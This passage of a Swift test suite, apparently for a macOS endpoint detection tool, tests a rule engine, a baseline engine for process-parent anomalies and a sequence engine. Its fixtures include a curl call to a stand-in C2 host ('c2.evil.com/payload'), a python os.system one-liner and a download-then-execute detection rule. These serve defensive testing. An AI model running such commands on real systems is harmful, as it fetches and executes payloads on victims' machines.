        let e3 = makeEvent(processPath: "/usr/bin/curl", commandLine: "curl https://c2.evil.com/payload")
        #expect(await engine.evaluate(e3).count == 1)

        // Random benign process — no match
        let e4 = makeEvent(processPath: "/usr/bin/ls", commandLine: "ls -la")
        #expect(await engine.evaluate(e4).isEmpty)
    }

    @Test("Condition tree: predicate group with range")
    func conditionTreePredicateGroup() async throws {
        // Rule with a group: predicates 0-1 are a selection (all_of), predicate 2 is a filter
        let rule = CompiledRule(
            id: "tree-group",
            title: "Group test",
            description: "Test",
            level: .low,
            tags: [],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                // [0] part of selection group
                Predicate(field: "Image", modifier: .endswith, values: ["/python3"], negate: false),
                // [1] part of selection group
                Predicate(field: "CommandLine", modifier: .contains, values: ["-c"], negate: false),
                // [2] filter
                Predicate(field: "CommandLine", modifier: .contains, values: ["pip"], negate: false),
            ],
            condition: .allOf,
            conditionTree: .and([
                .predicateGroup(range: 0..<2, mode: .allOf),
                .not(.predicate(2)),
            ]),
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)

        // python3 -c "import os" — should match (selection group AND NOT pip)
        let e1 = makeEvent(processPath: "/usr/bin/python3", commandLine: "python3 -c 'import os; os.system(\"id\")'")
        #expect(await engine.evaluate(e1).count == 1)

        // python3 -c pip install — should NOT match (filter blocks)
        let e2 = makeEvent(processPath: "/usr/bin/python3", commandLine: "python3 -c 'pip install requests'")
        #expect(await engine.evaluate(e2).isEmpty)
    }

    @Test("Condition tree loaded from compiled rules")
    func loadCompiledRulesWithTrees() async throws {
        let compiledDir = "/tmp/maccrab_compiled_v2"
        guard FileManager.default.fileExists(atPath: compiledDir) else { return }

        let engine = RuleEngine()
        let count = try await engine.loadRules(from: URL(fileURLWithPath: compiledDir))
        #expect(count > 100, "Expected 100+ compiled rules, got \(count)")

        // Verify rules with condition trees loaded correctly
        let rules = await engine.listRules(category: nil)
        let treesCount = rules.filter { $0.conditionTree != nil }.count
        #expect(treesCount > 10, "Expected 10+ rules with condition trees, got \(treesCount)")
    }

    @Test("Loads real compiled rules from the compiler output")
    func loadCompiledRules() async throws {
        let compiledDir = "/tmp/maccrab_compiled_rules"
        guard FileManager.default.fileExists(atPath: compiledDir) else {
            // Skip if compiler hasn't been run
            return
        }

        let engine = RuleEngine()
        let count = try await engine.loadRules(from: URL(fileURLWithPath: compiledDir))
        #expect(count > 100, "Expected 100+ compiled rules, got \(count)")
    }
}

// MARK: - BaselineEngine Tests

@Suite("BaselineEngine")
struct BaselineEngineTests {

    @Test("Learning mode records edges without alerting")
    func learningMode() async {
        let config = BLConfig(
            learningPeriod: 3600,
            sensitivity: .medium,
            enabled: true,
            focusPaths: [],
            exemptParents: [],
            exemptChildren: [],
            exemptEdges: []
        )
        let engine = BaselineEngine(config: config)

        let event = makeEvent(
            processPath: "/usr/bin/curl",
            pid: 200,
            ppid: 100
        )
        let match = await engine.evaluate(event)
        // In learning mode, should not alert
        #expect(match == nil)

        let status = await engine.status()
        #expect(status.state == BLState.learning)
    }

    @Test("Active mode detects novel edges")
    func activeDetection() async {
        let config = BLConfig(
            learningPeriod: 0, // Instant transition
            sensitivity: .high,  // High sensitivity: alert on ANY novel edge
            enabled: true,
            focusPaths: [],
            exemptParents: [],
            exemptChildren: [],
            exemptEdges: []
        )
        let engine = BaselineEngine(config: config)

        // Record a known edge during "learning" — use a non-exempt parent
        let knownEvent = makeEvent(processPath: "/usr/bin/ls", pid: 10, ppid: 50, parentPath: "/usr/local/bin/myapp")
        _ = await engine.evaluate(knownEvent)

        // Force to active
        await engine.activateDetection()

        // Known edge — should not alert
        let knownMatch = await engine.evaluate(knownEvent)
        #expect(knownMatch == nil)

        // Novel edge — should alert (different child, same parent)
        let novelEvent = makeEvent(processPath: "/tmp/evil", pid: 999, ppid: 50, parentPath: "/usr/local/bin/myapp")
        let novelMatch = await engine.evaluate(novelEvent)
        #expect(novelMatch != nil)
    }

    @Test("Disabled engine returns nil")
    func disabled() async {
        let config = BLConfig(
            learningPeriod: 0,
            sensitivity: .medium,
            enabled: false,
            focusPaths: [],
            exemptParents: [],
            exemptChildren: [],
            exemptEdges: []
        )
        let engine = BaselineEngine(config: config)
        let event = makeEvent()
        let match = await engine.evaluate(event)
        #expect(match == nil)
    }

    @Test("Reset clears baseline and returns to learning")
    func resetBaseline() async {
        let config = BLConfig(
            learningPeriod: 0,
            sensitivity: .medium,
            enabled: true,
            focusPaths: [],
            exemptParents: [],
            exemptChildren: [],
            exemptEdges: []
        )
        let engine = BaselineEngine(config: config)
        _ = await engine.evaluate(makeEvent(processPath: "/a", pid: 1, ppid: 0))
        await engine.activateDetection()
        #expect(await engine.status().state == BLState.active)

        await engine.resetBaseline()
        #expect(await engine.status().state == BLState.learning)
        #expect(await engine.allEdges().isEmpty)
    }
}

// MARK: - SequenceEngine Tests

@Suite("SequenceEngine")
struct SequenceEngineTests {

    @Test("Loads sequence rules from JSON")
    func loadRules() async throws {
        let lineage = ProcessLineage()
        let engine = SequenceEngine(lineage: lineage)

        let rule = SequenceRule(
            id: "seq-001",
            title: "Download then Execute",
            description: "Detects download followed by execution",
            level: .high,
            tags: ["attack.execution"],
            window: 60,
            correlationType: .processSame,
            ordered: true,
            steps: [
                SequenceStep(
                    id: "download",
                    logsourceCategory: "process_creation",
                    predicates: [Predicate(field: "Image", modifier: .endswith, values: ["/curl"], negate: false)],
                    condition: .allOf,
                    afterStep: nil,
                    processRelation: nil
                ),
                SequenceStep(
                    id: "execute",
                    logsourceCategory: "process_creation",
                    predicates: [Predicate(field: "Image", modifier: .startswith, values: ["/tmp/"], negate: false)],
                    condition: .allOf,
                    afterStep: "download",
                    processRelation: nil
                ),
            ],
            trigger: .allSteps,
            enabled: true
        )

        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        let data = try JSONEncoder().encode(rule)
        try data.write(to: tmpDir.appendingPathComponent("seq-001.json"))

        let count = try await engine.loadRules(from: tmpDir)
        #expect(count == 1)
    }
}

// MARK: - ProcessEdge Tests

@Suite("ProcessEdge")
struct ProcessEdgeTests {

    @Test("Serialization key roundtrips")
    func serializationKey() {
        let edge = PEdge(parentPath: "/sbin/launchd", childPath: "/usr/bin/curl")
        let key = edge.serializationKey
        let restored = PEdge.fromSerializationKey(key)
        #expect(restored != nil)
        #expect(restored?.parentPath == "/sbin/launchd")
        #expect(restored?.childPath == "/usr/bin/curl")
    }

    @Test("BaselineEngine.ProcessEdge is Hashable for use as dictionary key")
    func hashable() {
        let e1 = PEdge(parentPath: "/a", childPath: "/b")
        let e2 = PEdge(parentPath: "/a", childPath: "/b")
        let e3 = PEdge(parentPath: "/a", childPath: "/c")

        #expect(e1 == e2)
        #expect(e1 != e3)

        var dict: [PEdge: Int] = [:]
        dict[e1] = 1
        dict[e3] = 2
        #expect(dict[e2] == 1)
    }
}
